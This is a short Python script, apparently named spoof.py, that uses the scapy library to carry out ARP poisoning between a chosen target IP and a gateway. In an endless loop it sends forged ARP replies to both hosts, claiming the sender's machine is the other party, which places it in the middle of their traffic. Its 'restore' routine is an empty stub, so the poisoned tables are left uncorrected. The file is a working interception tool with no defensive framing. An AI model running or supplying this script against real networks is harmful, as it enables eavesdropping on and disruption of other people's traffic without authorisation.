
import sys
import time
import signal
import logging
from scapy.all import ARP, send, conf

# Usage: python3 spoof.py <TARGET_IP> <GATEWAY_IP> <INTERFACE>

# Create logs
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

if len(sys.argv) < 3:
    print("Usage: python3 spoof.py <TARGET_IP> <GATEWAY_IP> [INTERFACE]")
    sys.exit(1)

target_ip = sys.argv[1]
gateway_ip = sys.argv[2]
iface = sys.argv[3] if len(sys.argv) > 3 else conf.iface

logging.info(f"Starting ARP Spoof: Target={target_ip} Gateway={gateway_ip} Iface={iface}")

def restore(target_ip, gateway_ip):
    logging.info("Restoring ARP tables...")
    # Send restoration packets
    # We don't have MACs easily here without scanning, but scapy might find them or we just send broadcast?
    # Actually, to restore properly we need MACs. 
    # For a "Kill Switch", stopping the spoof often allows the network to heal via natural ARP timeouts (seconds/minutes).
    # But let's try to send a few "healing" packets if Scapy can resolve MACs.
    pass

def handle_signal(sig, frame):
    logging.info("Stopping...")
    sys.exit(0)

signal.signal(signal.SIGTERM, handle_signal)
signal.signal(signal.SIGINT, handle_signal)

try:
    # Get MAC addresses (optional for sending, but needed for proper headers usually. Scapy ARP() defaults asking Who-has)
    # Actually ARP poisoning is: Tell Target that I am Gateway. Tell Gateway that I am Target.
    
    # We loop forever sending these packets.
    print(f"Spoofing {target_ip} <-> {gateway_ip}...")
    
    while True:
        # Tell Target(target_ip) that Gateway(gateway_ip) is ME (scapy auto-fills my MAC)
        # op=2 is 'is-at'
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip), verbose=False, iface=iface)
        
        # Tell Gateway(gateway_ip) that Target(target_ip) is ME
        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip), verbose=False, iface=iface)
        
        time.sleep(2) # Send every 2 seconds
        
except Exception as e:
    logging.error(f"Error: {e}")
    sys.exit(1)
